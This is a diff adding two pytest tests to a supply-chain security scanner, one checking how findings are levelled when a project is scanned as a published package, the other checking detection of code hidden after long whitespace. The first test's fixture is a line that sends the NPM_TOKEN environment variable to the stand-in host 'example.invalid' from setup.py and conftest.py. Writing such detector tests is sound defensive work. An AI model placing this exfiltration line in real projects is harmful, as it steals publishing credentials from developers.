@@ -252,6 +252,33 @@ def test_commands_that_an_install_script_runs_are_analysed(tmp_path):
     assert lines == [("BS-NET-002", 2), ("BS-NET-002", 3), ("BS-NET-003", 4)]
 
 
+def test_a_published_package_keeps_levels_only_for_what_installing_runs(tmp_path):
+    exfiltrate = ("import os, urllib.request\n"
+                  "urllib.request.urlopen('https://example.invalid', os.environ['NPM_TOKEN'])\n")
+    root = build(tmp_path, {
+        "setup.py": exfiltrate,
+        "tests/conftest.py": exfiltrate,
+        ".github/workflows/ci.yml": ("on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
+                                     "    steps:\n      - uses: example-org/setup-tool@v1\n"),
+    })
+
+    def levels(report, suffix):
+        return {f.level for f in report.findings if f.path.endswith(suffix)}
+
+    as_project = scan([root])
+    as_package = scan([root], package=True)
+    assert Level.HIGH in levels(as_project, "conftest.py")
+    assert levels(as_project, "ci.yml") - {Level.INFO}
+    assert levels(as_package, "conftest.py") == {Level.INFO}
+    assert levels(as_package, "ci.yml") == {Level.INFO}
+    assert levels(as_package, "setup.py") == levels(as_project, "setup.py")
+    assert Level.HIGH in levels(as_package, "setup.py")
+    [pinned] = [f for f in as_package.findings if f.path.endswith("ci.yml")
+                and f.rule.id == "BS-PIN-001"]
+    assert any("installing it does not run" in note for note in pinned.limitations)
+    assert len(as_package.entry_points) == len(as_project.entry_points)
+
+
 def test_local_modules_that_setup_py_imports_are_followed(tmp_path):
     root = build(tmp_path, {
         "setup.py": "from setuptools import setup\nfrom demo.build import hook\nsetup()\n",
@@ -288,6 +315,15 @@ def test_conftest_with_code_hidden_after_whitespace(tmp_path):
     report = scan([root])
     assert [e.kind for e in report.entry_points] == ["conftest.py"]
     assert ids_at(report, "conftest.py") == {"BS-OB-001"}
+
+
+def test_deep_indentation_that_grows_step_by_step_is_not_padding(tmp_path):
+    nested = "".join(" " * depth + "[\n" for depth in range(0, 260, 2)) + " " * 260 + "1\n"
+    jump = "def f():\n    pass\n" + " " * 240 + "import os\n"
+    root = build(tmp_path, {"data.json": nested, "jump.py": jump})
+    report = scan([root / "data.json", root / "jump.py"])
+    assert ids_at(report, "data.json") == set()
+    assert ids_at(report, "jump.py") == {"BS-OB-001"}
 
 
 def test_in_tree_build_backend(tmp_path):
